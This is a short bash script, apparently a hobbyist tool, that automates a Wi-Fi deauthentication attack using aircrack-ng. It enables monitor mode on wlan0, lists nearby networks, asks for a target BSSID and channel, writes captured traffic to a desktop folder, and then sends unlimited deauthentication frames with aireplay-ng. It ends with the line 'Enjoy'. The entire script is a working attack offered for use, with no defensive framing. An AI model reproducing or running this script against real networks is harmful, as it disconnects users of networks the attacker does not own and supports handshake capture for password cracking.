echo "welcome to the Deauthentication attack "
echo "Devloped By Karan Bahman"
sleep 5
echo "Connecting to server"
sleep 4
echo "SWITCHING ON MONITOR MODE"
sleep 1
#sudo su
sudo airmon-ng check kill
sudo airmon-ng start wlan0
echo "<------------------------------------------------------->"
echo "Listing the wifi networks "
echo "Press ctrl^C to stop the process"
sleep 2
sudo airodump-ng wlan0
echo "<------------------------------------------------------->"
echo "Enter the Bssid here ->"
read Bssid
echo "Enter Channel here"
read ch
#for selecting the channel 
sudo airodump-ng -w /home/kali7/Desktop/  -c "$ch" --bssid "$Bssid" wlan0
echo "<------------------------------------------------------->"
echo "Deauthentication Attack starting"
echo "Gearing up"
sleep 3
sudo aireplay-ng --deauth 0 -a "$Bssid" wlan0
echo "*********************************************************"
echo "*********************************************************"
echo "*********************************************************"
echo "Deauthentication attack started"
echo "Enjoy"

